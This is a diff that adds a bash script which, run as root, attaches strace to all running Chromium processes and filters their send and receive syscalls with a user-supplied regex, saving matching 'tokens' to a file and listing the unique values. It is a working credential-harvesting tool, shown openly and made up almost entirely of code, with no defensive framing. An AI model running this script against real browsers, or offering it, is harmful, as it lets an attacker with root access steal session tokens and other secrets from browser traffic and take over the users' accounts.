@@ -1,0 +1,60 @@
+#!/usr/bin/env bash
+
+# This script will attach to chromium PIDs and search for strings matching the input regex.
+
+function strace_chrome() {
+    echo "[+] - Looking for regex '${regex}' and outputing to ${tok_file}"
+    echo "[+] - Press Ctrl-C to terminate execution."
+    for pid in $(pgrep chro); do
+        if ${verbose}; then
+            echo "[INFO] - Starting strace process for pid ${pid}."
+            strace -s99999 -yyy -f -p ${pid} -e signal=\!all -e send,sendto,recv,recvfrom -o"|grep -Po '${regex}' | tee -a '${tok_file}'" 2>/dev/null &
+        else
+            strace -s99999 -yyy -f -p ${pid} -e signal=\!all -e send,sendto,recv,recvfrom -o"|grep -Po '${regex}' >> '${tok_file}'" 2>/dev/null &
+        fi
+    done
+}
+
+function cleanup() {
+    echo -en '\r'
+    echo "[+] - Starting cleanup..."
+    echo "[+] - Unique token values:"
+    cat ${tok_file} | sort -u
+    echo "[+] - Killing strace processes."
+    pkill strace
+    exit 0
+}
+
+function check_root() {
+    if [[ ! $EUID -eq 0 ]]; then
+        echo "[ERROR] - script must be run as root"
+        exit 1
+    fi
+}
+
+function parse_args() {
+    if [[ $# -eq 2 ]]; then
+        verbose=false
+    elif [[ $# -eq 3 ]]; then
+        verbose=true
+    else
+        echo "usage: $0 regex output [-v]"
+        exit 2
+    fi
+
+    regex="$1"
+    tok_file="$2"
+}
+
+function main() {
+    parse_args "$@"
+    check_root
+    strace_chrome
+    sleep 500
+}
+
+tok_file=/tmp/chrome_toks
+set -uo pipefail
+trap cleanup EXIT
+
+main "$@"
